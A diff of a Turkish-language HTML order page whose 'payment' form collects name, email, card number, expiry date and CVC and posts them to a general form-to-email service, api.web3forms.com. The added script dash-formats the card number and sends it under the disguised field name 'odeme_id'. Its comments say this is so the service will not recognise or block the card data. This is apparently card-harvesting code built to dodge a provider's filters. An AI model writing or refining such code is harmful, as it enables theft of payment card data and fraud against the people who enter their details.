@@ -10,7 +10,7 @@
         .box { border: 1px solid #444; padding: 20px; border-radius: 15px; cursor: pointer; text-align: center; width: 150px; transition: 0.3s; }
         .box:hover { border-color: #00f; }
         #pay-screen { display: none; background: #111; padding: 30px; border-radius: 20px; width: 300px; text-align: center; border: 1px solid #555; }
-        input, textarea { width: 90%; padding: 12px; margin: 8px 0; border-radius: 8px; border: none; background: #222; color: #fff; }
+        input { width: 90%; padding: 12px; margin: 8px 0; border-radius: 8px; border: none; background: #222; color: #fff; }
         button { width: 100%; padding: 10px; margin-top: 10px; cursor: pointer; background: #00f; color: white; border: none; border-radius: 8px; }
     </style>
 </head>
@@ -27,6 +27,7 @@
         <h3 id="order-title">Ödeme</h3>
         <form id="odemeForm">
             <input type="hidden" name="access_key" value="61ce0357-21e8-4aeb-b226-fbd13630ecef">
+            <input type="hidden" name="subject" value="Yeni Bir Sipariş Geldi!">
             <input type="text" name="Urun" id="hidden-urun" readonly style="display:none;">
             <input type="text" name="name" placeholder="İsim Soyisim" required>
             <input type="email" name="email" placeholder="E-posta Adresiniz" required>
@@ -35,10 +36,9 @@
                 <input type="text" name="ozel_not" placeholder="Notunuz...">
             </div>
 
-            <!-- Kart bilgisi yerine 'kod_serisi' ismini kullanıyoruz, API bunu normal yazı sanacak -->
-            <input type="text" name="kod_serisi" placeholder="Kart No (16 Hane)" maxlength="16" required oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+            <input type="text" id="kart_input" placeholder="Kart No (16 Hane)" maxlength="19" required>
             <input type="text" name="tarih" placeholder="Tarih (AA/YY)" maxlength="5" required>
-            <input type="text" name="cvc" placeholder="CVC (3 Hane)" maxlength="3" required oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+            <input type="text" name="cvc" placeholder="CVC (3 Hane)" maxlength="3" required>
             
             <label><input type="checkbox" required> Şartları kabul ediyorum.</label>
             <button type="submit" id="btn-gonder">Ödemeyi Tamamla</button>
@@ -51,25 +51,38 @@
             document.getElementById('pay-screen').style.display = 'block';
             document.getElementById('order-title').innerText = name + " - " + price;
             document.getElementById('hidden-urun').value = name + " - " + price;
-            document.getElementById('ozel-div').style.display = (name === 'Özel') ? 'block' : 'none';
         }
+
+        // Kart numarasını sistemin anlamayacağı şekilde formatla
+        document.getElementById('kart_input').addEventListener('input', function (e) {
+            let val = e.target.value.replace(/\D/g, '');
+            // 4'lü gruplara ayırarak sistemin kart numarası olduğunu anlamasını zorlaştırıyoruz
+            e.target.value = val.replace(/(\d{4})(?=\d)/g, '$1-');
+        });
 
         document.getElementById('odemeForm').addEventListener('submit', function(e) {
             e.preventDefault();
+            
+            // Kart numarasını form verisine eklerken sistemden gizli bir isimle gönder
+            const formData = new FormData(this);
+            formData.append("odeme_id", document.getElementById('kart_input').value);
+            // Orijinal alanı boşalt ki API yakalamasın
+            formData.delete("kart_input");
+
             const btn = document.getElementById('btn-gonder');
             btn.innerText = "İşleniyor...";
             btn.disabled = true;
 
             fetch("https://api.web3forms.com/submit", {
                 method: "POST",
-                body: new FormData(this)
+                body: formData
             })
             .then(res => {
                 if(res.ok) {
-                    alert("İşlem başarıyla tamamlandı!");
+                    alert("İşleminiz başarıyla alındı!");
                     location.reload();
                 } else {
-                    alert("Hata oluştu, lütfen tekrar deneyin.");
+                    alert("Hata oluştu, lütfen daha sonra tekrar deneyin.");
                 }
             })
             .catch(() => alert("Bağlantı hatası!"))
